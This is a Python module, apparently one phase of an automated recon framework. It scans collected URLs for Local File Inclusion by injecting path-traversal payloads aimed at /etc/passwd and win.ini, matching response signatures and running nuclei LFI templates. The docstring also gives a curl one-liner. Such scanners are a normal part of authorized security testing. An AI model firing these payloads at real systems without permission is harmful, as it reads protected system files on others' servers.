"""
Phase 21: LFI (Local File Inclusion) Detection
One-liner: gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% sh -c
'curl -s "%" | grep -q "root:x" && echo "VULN! %"'
"""

import os
from core.runner import run_command, tool_exists
from core.utils import read_lines, write_lines
from config import TOOLS, THREADS

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "....//....//....//....//....//windows/win.ini",
]

LFI_SIGNATURES = [
    "root:x:",
    "root:*:",
    "daemon:x:",
    "bin/bash",
    "[extensions]",  # win.ini
    "for 16-bit app support",  # win.ini
]


def run_lfi_qsreplace(input_file: str, output_file: str, logger) -> list[str]:
    """LFI check via qsreplace + httpx response matching."""
    qsreplace = TOOLS.get("qsreplace", "qsreplace")
    httpx = TOOLS["httpx"]

    if not tool_exists(qsreplace) or not tool_exists(httpx):
        return []

    urls = read_lines(input_file)
    if not urls:
        return []

    logger.info(f"Testing {len(urls)} URLs for LFI...")
    findings = []

    for payload in LFI_PAYLOADS[:3]:
        stdin_data = "\n".join(urls)
        cmd_qs = [qsreplace, payload]
        rc, replaced, _ = run_command(cmd_qs, timeout=30, stdin_data=stdin_data)
        if not replaced:
            continue

        signature = "root:x:|root:\\*:|daemon:x:|\\[extensions\\]"
        cmd_httpx = [
            httpx, "-silent", "-nc", "-mc", "200",
            "-mr", signature,
            "-t", str(min(THREADS, 20)),
        ]
        rc, stdout, _ = run_command(cmd_httpx, timeout=60, stdin_data=replaced)
        if stdout:
            for line in stdout.strip().split("\n"):
                if line.strip():
                    findings.append(f"[LFI] {line.strip()} (payload: {payload})")
                    logger.success(f"  LFI found: {line.strip()[:80]}")

    unique = sorted(set(findings))
    write_lines(output_file, unique)
    logger.found_count("LFI vulnerabilities", len(unique))
    return unique


def run_nuclei_lfi(input_file: str, output_file: str, logger) -> list[str]:
    """Run nuclei LFI/path-traversal templates."""
    tool = TOOLS["nuclei"]
    if not tool_exists(tool):
        return []

    logger.info("Running nuclei LFI templates...")
    cmd = [
        tool, "-l", input_file,
        "-tags", "lfi",
        "-o", output_file, "-silent", "-rl", "30",
    ]
    rc, stdout, stderr = run_command(cmd, timeout=600)

    results = read_lines(output_file)
    logger.found_count("LFI (nuclei)", len(results))
    return results


def run_phase(domain: str, scan_dir: str, logger) -> str:
    """Run Phase 21: LFI Detection."""
    logger.phase_start(21, "LFI Detection", "qsreplace + nuclei")

    lfi_file = os.path.join(scan_dir, "urls_lfi.txt")
    params_file = os.path.join(scan_dir, "parameters.txt")

    if os.path.isfile(lfi_file) and read_lines(lfi_file):
        source = lfi_file
        logger.info(f"Using {len(read_lines(source))} LFI-categorized URLs")
    elif os.path.isfile(params_file) and read_lines(params_file):
        source = params_file
    else:
        logger.warning("No parameterized URLs - skipping LFI")
        logger.phase_end(21, "LFI Detection", 0)
        return ""

    phase_dir = os.path.join(scan_dir, "phase21_lfi")
    os.makedirs(phase_dir, exist_ok=True)

    all_results = []

    # Technique 1: qsreplace + httpx
    qs_file = os.path.join(phase_dir, "qsreplace_lfi.txt")
    qs_results = run_lfi_qsreplace(source, qs_file, logger)
    all_results.extend(qs_results)

    # Technique 2: nuclei LFI templates
    nuclei_file = os.path.join(phase_dir, "nuclei_lfi.txt")
    nuclei_results = run_nuclei_lfi(source, nuclei_file, logger)
    all_results.extend(nuclei_results)

    lfi_results = os.path.join(scan_dir, "lfi_results.txt")
    write_lines(lfi_results, sorted(set(all_results)))

    logger.phase_end(21, "LFI Detection", len(set(all_results)))
    return lfi_results
